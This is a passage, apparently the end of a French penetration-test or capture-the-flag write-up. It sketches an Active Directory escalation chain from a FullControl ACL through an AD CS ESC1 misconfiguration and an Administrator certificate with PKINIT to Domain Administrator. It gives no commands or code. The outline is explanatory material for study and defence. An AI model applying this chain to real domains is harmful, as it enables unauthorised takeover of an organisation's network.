   ↓
FullControl
   ↓
ESC1
   ↓
certificat Administrator
   ↓
PKINIT
   ↓
Domain Administrator
```

C'est donc avant tout une **privesc Active Directory basée sur une chaîne d'ACL et une mauvaise configuration AD CS**, et non une simple élévation locale de privilèges Windows.
